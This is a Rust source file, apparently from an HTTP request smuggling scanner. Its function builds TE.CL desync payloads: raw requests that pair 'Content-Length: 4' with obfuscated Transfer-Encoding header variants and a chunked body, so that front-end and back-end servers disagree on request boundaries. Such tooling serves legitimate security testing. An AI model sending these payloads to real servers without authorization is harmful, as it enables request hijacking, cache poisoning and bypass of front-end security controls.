use super::{format_cookies, format_custom_headers, te_variations::get_te_header_variations};

/// Generate TE.CL (Transfer-Encoding vs Content-Length) attack payloads.
///
/// Returns raw request bytes (`Vec<Vec<u8>>`) so the Transfer-Encoding
/// obfuscation variants that embed bytes > 0x7F are sent verbatim rather than
/// mangled into U+FFFD by a UTF-8 `String`.
pub fn get_te_cl_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<Vec<u8>> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::with_capacity(te_headers.len());
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        // `Content-Length: 4` frames the body as `1\r\nA` for the front-end (CL),
        // while the back-end (TE) consumes the full chunked body `1\r\nA\r\n0\r\n\r\n`.
        let head = format!(
            "{method} {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Connection: keep-alive\r\n\
             {custom_header_str}\
             {cookie_str}\
             Content-Length: 4\r\n"
        );
        let mut req = Vec::with_capacity(head.len() + te_header.len() + 24);
        req.extend_from_slice(head.as_bytes());
        req.extend_from_slice(te_header);
        req.extend_from_slice(b"\r\n\r\n1\r\nA\r\n0\r\n\r\n");
        payloads.push(req);
    }
    payloads
}
